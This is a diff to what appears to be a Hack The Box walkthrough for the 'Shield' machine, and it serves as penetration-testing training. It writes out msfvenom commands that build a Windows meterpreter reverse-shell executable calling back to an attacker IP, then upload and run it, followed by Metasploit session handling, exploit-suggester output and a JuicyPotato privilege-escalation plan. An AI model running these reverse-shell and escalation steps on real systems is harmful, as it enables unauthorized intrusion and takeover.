@@ -167,10 +167,12 @@ meterpreter >
 
 ## Upgrading the Meterpreter Reverse Shell
 
-That gives us a meterpreter shell that is a little unstable and also, because it is written in PHP, somewhat limited in its abilities. We are going to generate a better meterpreter shell using a program called msfvenom. To start with we can use msfvenom to generate a Windows executable program that will run the meterpreter reverse shell. To do this, we can type
+That gives us a meterpreter shell that is a little unstable and also, because it is written in PHP, somewhat limited in its abilities. We are going to generate a better meterpreter shell using a program called msfvenom. To start with we can use msfvenom to generate a Windows executable program that will run the meterpreter reverse shell. To do this, we need to exit from the meterpreter session by typing bg and then hit return.
+
+Then we can type
 
 ```text
-meterpreter > msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=6001 -f exe > revshell.exe
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=6001 -f exe > revshell.exe
 [*] exec: msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=6001 -f exe > revshell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -183,7 +185,25 @@ Final size of exe file: 206848 bytes
 If you have problems running msfvenom within Metasploit, you can run it from the command line in bash
 {% endhint %}
 
-Once the payload is created, we can upload it to the Shield machine using the meterpreter command upload:
+Once the payload is created, we can upload it to the Shield machine.  We need to get back into the current meterpreter session first. We do that with the sessions command. Just typing sessions will list the current sessions available. We can interact with a session using the sessions -i &lt;session number&gt; command:
+
+```bash
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information        Connection
+  --  ----  ----                     -----------        ----------
+  1         meterpreter php/windows  IUSR (0) @ SHIELD  10.10.14.13:4444 -> 10.10.10.29:57574 (10.10.10.29)
+
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > 
+```
+
+Once back in the meterpreter session , we can upload the revshell.exe using the meterpreter command upload:
 
 ```text
 meterpreter > upload revshell.exe
@@ -227,7 +247,7 @@ msf6 exploit(multi/handler) > sessions -i 1
 meterpreter >
 ```
 
-We can then just execute the meterpreter reverse shell by executing revshell.exe and waiting for the new meterpreter session to start.
+We can then just execute the meterpreter reverse shell by executing revshell.exe and waiting for the new meterpreter session to start. We then background the first session and interact with the new meterpreter session we just created.
 
 ```text
 meterpreter > execute -f revshell.exe
@@ -256,16 +276,37 @@ msf6 post(multi/recon/local_exploit_suggester) > set SESSION 2
 SESSION => 2
 msf6 post(multi/recon/local_exploit_suggester) > run
 [*] 10.10.10.29 - Collecting local exploits for x64/windows...
-[*] 10.10.10.29 - 17 exploit checks are being tried...
+[*] 10.10.10.29 - 26 exploit checks are being tried...
 [+] 10.10.10.29 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
-nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.10.29 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
+[+] 10.10.10.29 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
 [+] 10.10.10.29 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
 [+] 10.10.10.29 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
 [*] Post module execution completed
-msf6 post(multi/recon/local_exploit_suggester) >
+msf6 post(multi/recon/local_exploit_suggester) > 
 ```
 
 Normally when reviewing possible exploits, experience will tell you which ones are likely to work better than others. In some cases though it might be a question of trial and error to find one that works. This could be a problem if any of the exploits leave the machine in an unstable state. If that is the case in Hack The Box, you can ask for the machine to be reset.
+
+{% hint style="danger" %}
+There is a bug in the current version of Metasploit. If you get an exception "Post failed - NameError uninitialized constant Msf::Exploit::CheckCode::NotSupported" there is a fix on GitHub
+
+Otherwise, you can edit the file yourself:
+
+```bash
+sudo vi /usr/share/metasploit-framework/modules/exploits/windows/local/cve_2020_1054_drawiconex_lpe.rb
+```
+
+and change line 112 from CheckCode::NotSupported to CheckCode::Safe
+
+```text
+Remove this on 112 --> return CheckCode::NotSupported
+Add this instead   --> return CheckCode::Safe("No target for win32k.sys version #{build_num_gemversion}")
+```
+
+  
+restart metasploit after this.
+{% endhint %}
 
 From experience, I know that the most promising exploit is going to be ms16\_075\_reflection\_juicy which is the JuicyPotato exploit. This vulnerability allows for privilege escalation through impersonation of the System user. It occurs if the user doing the exploit has certain privileges, notable the SeImpersonate privilege. Unfortunately, the Metasploit module doesn’t work as is and so you have to do this manually by downloading JuicyPotato.exe from [https://github.com/ohpe/juicy-potato/releases/tag/v0.1](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)
 
